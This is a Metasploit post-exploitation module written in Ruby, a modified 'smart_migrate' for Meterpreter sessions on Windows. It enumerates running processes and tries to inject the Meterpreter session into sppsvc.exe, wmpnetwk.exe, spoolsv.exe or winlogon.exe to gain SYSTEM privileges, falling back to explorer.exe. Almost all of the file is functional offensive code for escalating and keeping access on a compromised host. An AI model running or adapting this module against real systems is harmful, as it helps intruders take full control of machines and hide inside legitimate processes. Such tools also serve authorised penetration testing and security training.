##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'rex'

class Metasploit3 < Msf::Post

  def initialize(info={})
    super( update_info( info,
      'Name'          => 'Windows Manage System Process Migration',
      'Description'   => %q{ This is a moddified smart_migrate module for Meterpreter.
        First it will attempt to migrate to a proccess with SYSTEM level access. If that fails 
        it will attempt to migrate to an explorer.exe process.},
      'License'       => MSF_LICENSE,
      'Author'        => [ 'original:thelightcosine/modder:xor-function'],
      'Platform'      => [ 'win' ],
      'SessionTypes'  => [ 'meterpreter' ]
    ))


  end

  def run
    server = client.sys.process.open
    original_pid = server.pid
    print_status("Current server process: #{server.name} (#{server.pid})")

    uid = client.sys.config.getuid
    
    processes = client.sys.process.get_processes
    
    spp_procs = []
    wmp_procs = []
    spool_procs = []
    winlogon_procs = []
    explorer_procs = []
    processes.each do |proc|
      spp_procs << proc if proc['name'] == "sppsvc.exe"
      wmp_procs << proc if proc['name'] == "wmpnetwk.exe"
      spool_procs << proc if proc['name'] == "spoolsv.exe"
      winlogon_procs << proc if proc['name'] == "winlogon.exe"
      explorer_procs << proc if proc['name'] == "explorer.exe"
    end

    print_status "Attempting to move into sppsvc.exe for SYSTEM..."
    spp_procs.each { |proc| return if attempt_migration(proc['pid']) }
    print_status "Attempting to move into wmpnetwk.exe for SYSTEM..."
    wmp_procs.each { |proc| return if attempt_migration(proc['pid']) }
    print_status "Attempting to move into spoolsv.exe for SYSTEM..."
    spool_procs.each { |proc| return if attempt_migration(proc['pid']) }
    print_status "Attempting to move into winlogon.exe for SYSTEM..."
    winlogon_procs.each { |proc| return if attempt_migration(proc['pid']) }
    print_status "Attempting to move into explorer.exe..."
    explorer_procs.each { |proc| return if attempt_migration(proc['pid']) }

    print_error "Was unable to sucessfully migrate into any of our likely candidates"
  end


  def attempt_migration(target_pid)
    begin
      print_good("Migrating to #{target_pid}")
      client.core.migrate(target_pid)
      print_good("Successfully migrated to process #{target_pid}")
      return true
    rescue ::Exception => e
      print_error("Could not migrate in to process.")
      print_error(e.to_s)
      return false
    end
  end
end
